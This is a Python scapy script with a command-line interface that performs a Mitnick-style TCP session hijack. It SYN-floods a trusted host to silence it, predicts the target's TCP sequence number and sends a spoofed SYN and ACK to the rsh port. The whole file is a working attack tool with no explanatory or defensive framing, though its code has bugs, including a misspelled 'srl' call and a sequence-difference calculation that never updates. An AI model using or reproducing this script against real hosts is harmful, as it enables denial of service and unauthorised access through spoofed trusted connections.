import argparse
from scapy.all import *


def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)


def calTSN(tgt):
    seqNum = 0
    preNum = 0
    diffSeq = 0

    for x in range(1,5):
        if preNum != 0:
            preNum = seqNum

        pkt = IP(dst=tgt) / TCP()
        ans = srl(pkt, verbose=0)
        seqNum = ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        print('[+] TCP Seq Difference: ' + str(diffSeq))

    return seqNum + diffSeq


def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer

    send(synPkt)

    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    
    send(ackPkt)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-s', dest='synSpoof', type=str,
        required=True, help='specify src for SYN Flood')
    parser.add_argument(
        '-S', dest='srcSpoof', type=str,
        required=True, help='specify src for spoofed connection')
    parser.add_argument(
        '-t', dest='tgt', type=str,
        required=True, help='spcify target address')
    options = parser.parse_args()

    synSpoof = options.synSpoof
    srcSpoof = options.srcSpoof
    tgt = options.tgt

    print('[+] Starting SYN Flood to suppress remote server.')

    synFlood(synSpoof, srcSpoof)

    print('[+] Calculating correct TCP Sequence Number.')

    seqNum = calTSN(tgt) + 1

    print('[+] Spoofing Connection.')

    spoofConn(srcSpoof, tgt, seqNum)

    print('[+] Done.')


if __name__ == '__main__':
    main()
